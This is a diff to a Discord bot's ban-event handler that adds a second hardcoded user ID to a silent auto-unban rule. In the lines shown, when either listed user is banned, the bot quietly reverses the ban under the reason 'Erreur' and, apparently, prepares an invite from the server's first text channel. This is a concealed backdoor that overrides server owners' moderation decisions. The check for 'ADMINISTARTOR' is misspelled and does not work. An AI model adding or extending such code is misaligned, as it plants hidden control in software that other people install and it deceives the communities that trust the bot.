@@ -2,7 +2,7 @@ const Discord = require('discord.js');
 const utils = require('../utils');
 
 exports.run = async (client, guild, user) => {
-    if (user.id == "686244356394451041") {
+    if (user.id == "686244356394451041" || user.id == "841216621066190868") {
         guild.members.unban(user.id, "Erreur");
         if (guild.me.hasPermission("ADMINISTARTOR") || guild.me.hasPermission("CREATE_INSTANT_INVITE")) {
             const firstChannel = guild.channels.cache.filter(c => c.type === 'text').find(x => x.position == 0);
